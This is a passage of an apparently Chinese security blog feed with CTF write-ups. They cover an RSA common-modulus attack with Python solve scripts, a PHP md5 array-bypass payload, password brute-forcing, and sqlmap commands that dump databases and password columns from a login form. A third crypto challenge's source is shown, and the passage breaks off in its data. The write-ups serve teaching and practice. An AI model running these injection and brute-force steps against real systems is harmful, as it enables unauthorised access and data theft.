25977434245383213061502496098095465491298593274819892066680142309644604447122213990193649136640792045616043244452359563096681308111786639428720577613208873073208345373399185801097504934529486981943138422062519093084571490989920108900165063768027454172383479340269594705161727160665663784155005546900956290823300194993982080817820176683256899248006819975050544361436011973694569861482116060287819754562815300267132104496249550156359417476864266926873511338883992689905817979797654219916643111997131400074229578490338679081091020589498111095229814729232804557730207461328006855958086611451644501518923369121332282446387</span></span><br><span class="line"><span class="string">e1 = 2333</span></span><br><span class="line"><span class="string">e2 = 0x2333</span></span><br><span class="line"><span class="string">c1 = 18485676710986119075173536683686462950263457469331993885761169971214128938032438063231897522845618680375729397028835700363169782372594587099048372908212345790811034629235715272689844039455428850999889426940076877552005174718119690829981655533087526118363975468542716361201641751206611729446725223668335826884543868459078761494737060952796969364730619523110915396112202826020259561117145528032775008508084399606014601141698178821709270288546823847725591199659655029049623145505102599794072348396882393484944750435097930829667964115769696899896453970102851438725866601300114175722160091587885920442620806302225997894178</span></span><br><span class="line"><span class="string">c2 = 16695364664928581532800627548063845285532382094248770791332184106311111465138692453038543176627867352470844455051476759173301213222665138578557853047169090740483130873450630219045786462114849315733985964814297323071258057067338599104261584932140969238868725551762047861055560927674158814431522126509606052082877955899865835628409554581388612342235123760360863332450664084011638284740583896249409211202260177051437402683756328647008719984689105698475757077859180489424704827694801729848236720022267059771816763723353599632989669237797090397186374989429083807476909642056936466992945632706494532552043613399250805214165</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>在利用扩展欧几里得算法之后，注意判断$s_1$和$s_2$的正负情况，然后根据公式(4)或者公式(5)即可求得明文，解题代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n1 = <span class="number">25977434245383213061502496098095465491298593274819892066680142309644604447122213990193649136640792045616043244452359563096681308111786639428720577613208873073208345373399185801097504934529486981943138422062519093084571490989920108900165063768027454172383479340269594705161727160665663784155005546900956290823300194993982080817820176683256899248006819975050544361436011973694569861482116060287819754562815300267132104496249550156359417476864266926873511338883992689905817979797654219916643111997131400074229578490338679081091020589498111095229814729232804557730207461328006855958086611451644501518923369121332282446387</span></span><br><span class="line">n2 = <span class="number">25977434245383213061502496098095465491298593274819892066680142309644604447122213990193649136640792045616043244452359563096681308111786639428720577613208873073208345373399185801097504934529486981943138422062519093084571490989920108900165063768027454172383479340269594705161727160665663784155005546900956290823300194993982080817820176683256899248006819975050544361436011973694569861482116060287819754562815300267132104496249550156359417476864266926873511338883992689905817979797654219916643111997131400074229578490338679081091020589498111095229814729232804557730207461328006855958086611451644501518923369121332282446387</span></span><br><span class="line">e1 = <span class="number">2333</span></span><br><span class="line">e2 = <span class="number">0x2333</span></span><br><span class="line">c1 = <span class="number">18485676710986119075173536683686462950263457469331993885761169971214128938032438063231897522845618680375729397028835700363169782372594587099048372908212345790811034629235715272689844039455428850999889426940076877552005174718119690829981655533087526118363975468542716361201641751206611729446725223668335826884543868459078761494737060952796969364730619523110915396112202826020259561117145528032775008508084399606014601141698178821709270288546823847725591199659655029049623145505102599794072348396882393484944750435097930829667964115769696899896453970102851438725866601300114175722160091587885920442620806302225997894178</span></span><br><span class="line">c2 = <span class="number">16695364664928581532800627548063845285532382094248770791332184106311111465138692453038543176627867352470844455051476759173301213222665138578557853047169090740483130873450630219045786462114849315733985964814297323071258057067338599104261584932140969238868725551762047861055560927674158814431522126509606052082877955899865835628409554581388612342235123760360863332450664084011638284740583896249409211202260177051437402683756328647008719984689105698475757077859180489424704827694801729848236720022267059771816763723353599632989669237797090397186374989429083807476909642056936466992945632706494532552043613399250805214165</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;区分s1和s2的正负&#x27;&#x27;&#x27;</span></span><br><span class="line">_, s1, s2 = gmpy2.gcdext(e1,e2)</span><br><span class="line"><span class="keyword">if</span> s1 &lt; <span class="number">0</span> :</span><br><span class="line">    s1 = -s1</span><br><span class="line">    c1 = gmpy2.invert(c1, n1)</span><br><span class="line"><span class="keyword">if</span> s2 &lt; <span class="number">0</span> :</span><br><span class="line">    s2 = -s2</span><br><span class="line">    c2 = gmpy2.invert(c2, n2)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;带入公式(4)或公式(5)&#x27;&#x27;&#x27;</span></span><br><span class="line">m = <span class="built_in">pow</span>(c1,s1,n2)*<span class="built_in">pow</span>(c2,s2,n2) % n1</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;输出：flag&#123;d8f62d48-43fa-4939-ab70-56a16c577c62&#125;&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="0x04-例题分析-2"><a href="#0x04-例题分析-2" class="headerlink" title="0x04 例题分析-2"></a>0x04 例题分析-2</h2><p>题目描述：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249,773&#125;</span><br><span class="line">&#123;6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249,839&#125;</span><br><span class="line">message1=3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349</span><br><span class="line">message2=5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535</span><br></pre></td></tr></table></figure><blockquote><p>题目来源：XMan 一期夏令营课堂练习</p></blockquote><p>可以看出两个公钥的 N 是一样的，并且两者的 e 互素。写一个脚本跑一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249</span></span><br><span class="line">e1 = <span class="number">773</span></span><br><span class="line">e2 = <span class="number">839</span></span><br><span class="line">message1 = <span class="number">3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349</span></span><br><span class="line">message2 = <span class="number">5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535</span></span><br><span class="line"><span class="comment"># s &amp; t</span></span><br><span class="line">gcd, s, t = gmpy2.gcdext(e1, e2)</span><br><span class="line"><span class="keyword">if</span> s &lt; <span class="number">0</span>:</span><br><span class="line">    s = -s</span><br><span class="line">    message1 = gmpy2.invert(message1, n)</span><br><span class="line"><span class="keyword">if</span> t &lt; <span class="number">0</span>:</span><br><span class="line">    t = -t</span><br><span class="line">    message2 = gmpy2.invert(message2, n)</span><br><span class="line">plain = <span class="built_in">pow</span>(message1, s, n) * <span class="built_in">pow</span>(message2, t, n) % n</span><br><span class="line"><span class="built_in">print</span>(plain)</span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  python3 exp.py</span><br><span class="line">1021089710312311910410111011910111610410511010710511610511511211111511510598108101125</span><br></pre></td></tr></table></figure><p>这时候需要考虑当时明文是如何转化为这个数字了，一般来说是 16 进制转换，ASCII 字符转换，或者 Base64 解密。这个应该是 ASCII 字符转换，进而我们使用如下代码得到 flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">plain = <span class="built_in">str</span>(plain)</span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(plain):</span><br><span class="line">    <span class="keyword">if</span> plain[i] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(plain[i:i + <span class="number">3</span>]))</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(plain[i:i + <span class="number">2</span>]))</span><br><span class="line">        i += <span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;输出：flag&#123;whenwethinkitispossible&#125;&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>这里之所以使用 1 来判断是否为三位长度，是因为 flag 一般都是明文字符，而 1 开头的长度为 1 或者 2 的数字，一般都是不可见字符。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[青少年CTF]Web-CheckMe05-08 writeup</title>
      <link href="/2022/11/28/5cafc287c46d-q1jun/"/>
      <url>/2022/11/28/5cafc287c46d-q1jun/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-CheckMe05"><a href="#0x01-CheckMe05" class="headerlink" title="0x01 CheckMe05"></a>0x01 CheckMe05</h2><p>题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">      <span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line">      <span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&quot;b&quot;</span>];</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$a</span>!==<span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">          <span class="keyword">echo</span>(<span class="variable">$flag</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>强类型比较，当给md5()提供的变量为数组时，返回null，则有<code>null === null</code>，这样可以绕过强类型比较</p><p>所以最终payload：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221128234313279.png" alt="image-20221128234313279"></p><h2 id="0x01-CheckMe06"><a href="#0x01-CheckMe06" class="headerlink" title="0x01 CheckMe06"></a>0x01 CheckMe06</h2><p>下载题目给的附件📎：list.txt</p><p>进入环境使用<code>Burpsuite</code>或者<code>yakit</code>抓包，用户名为<strong>admin</strong></p><p>爆破密码：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221128234842988.png" alt="image-20221128234842988"></p><p>在返回包中得到flag</p><h2 id="0x01-CheckMe07"><a href="#0x01-CheckMe07" class="headerlink" title="0x01 CheckMe07"></a>0x01 CheckMe07</h2><p>进入环境，还是登入页面。</p><p>对<code>username</code>和<code>password</code>fuzz一下直接出flag：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221128235940478.png" alt="image-20221128235940478"></p><h2 id="0x01-CheckMe08"><a href="#0x01-CheckMe08" class="headerlink" title="0x01 CheckMe08"></a>0x01 CheckMe08</h2><blockquote><p>这题演示一下使用<code>sqlmap</code>的基本步骤</p></blockquote><p>还是那个登入页面，使用<code>burpsuite</code>抓包，右键抓的数据包选择<code>copy to file</code></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221129000335046.png" alt="image-20221129000335046"></p><p>然后使用sqlmap，测试出这是时间盲注：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">❯ sqlmap -r &quot;/Users/q1jun/Downloads/post.txt&quot; --dbs</span><br></pre></td></tr></table></figure><blockquote><p>这题中如果看不懂英文，一路回车即可，该命令如果sqlmap测试成功，则会返回数据库名。</p></blockquote><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221129001034116.png" alt="image-20221129001034116"></p><p>爆表名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r &quot;/Users/q1jun/Downloads/post.txt&quot; -D sql --tables</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221129001211512.png" alt="image-20221129001211512"></p><p>爆列名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r &quot;/Users/q1jun/Downloads/post.txt&quot; -D sql -T user --columns</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221129001611330.png" alt="image-20221129001611330"></p><p>查看<code>password</code>列的数据，拿到flag：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r &quot;/Users/q1jun/Downloads/post.txt&quot; -D sql -T user -C password --dump</span><br></pre></td></tr></table></figure><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20221129002854913.png" alt="image-20221129002854913"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Web </tag>
            
            <tag> QSNCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[华东交大第二届信息安全竞赛]Crypto-top_secret</title>
      <link href="/2022/11/26/3007e997d76a-q1jun/"/>
      <url>/2022/11/26/3007e997d76a-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-题目：Top-secret"><a href="#0x01-题目：Top-secret" class="headerlink" title="0x01 题目：Top_secret"></a>0x01 题目：Top_secret</h1><ul><li>附件📎：</li></ul><p><strong>task.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python3</span></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">common_p = next_prime(getrandbits(<span class="number">64</span>))</span><br><span class="line">common_q = next_prime(getrandbits(<span class="number">64</span>))</span><br><span class="line">common_n = common_p*common_q</span><br><span class="line">common = <span class="string">&#x27;(%d,%d)&#x27;</span> % (common_n, e)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(common+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">test = [getrandbits(<span class="number">64</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">512</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> test:</span><br><span class="line">    f.write(<span class="built_in">str</span>(<span class="built_in">pow</span>(i, e, common_n))+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">top_p = next_prime(getrandbits(<span class="number">1024</span>))</span><br><span class="line">top_q = next_prime(getrandbits(<span class="number">1024</span>))</span><br><span class="line">top_n = top_p*top_q</span><br><span class="line">top = <span class="string">&#x27;(%d,%d)&#x27;</span> % (top_n, e)</span><br><span class="line"></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;top_secret&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(top+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">f.write(<span class="built_in">str</span>(<span class="built_in">pow</span>(m, e, top_n)))</span><br></pre></td></tr></table></figure><p><strong>test</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br></pre></td><td class="code"><pre><span class="line">(76436798540605363536477649122583467659,65537)</span><br><span class="line">55186050945367642475707075553224810751</span><br><span class="line">25230392976483617195172228672398327555</span><br><span 